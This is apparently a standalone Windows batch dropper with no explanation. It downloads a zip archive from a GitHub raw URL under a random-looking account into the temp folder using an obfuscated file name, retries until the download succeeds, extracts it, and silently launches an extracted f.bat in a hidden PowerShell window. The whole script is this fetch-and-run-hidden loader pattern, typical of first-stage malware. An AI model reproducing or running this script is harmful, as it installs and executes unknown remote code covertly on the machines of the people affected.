@echo off
setlocal
set "url=https://github.com/avsjnavsfvsaf/a/raw/refs/heads/main/f2.zip"
set "tempdir=%temp%"
set "output=%tempdir%\4g5h790g2345h78945h-890v2345h789-3v5h.zip"
:download
if exist "%output%" del "%output%"
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
for %%A in ("%output%") do (
    if %%~zA==0 (
        del "%output%"
        timeout /t 1 >nul
        goto download
    )
)
powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\f.bat -WindowStyle Hidden"
exit
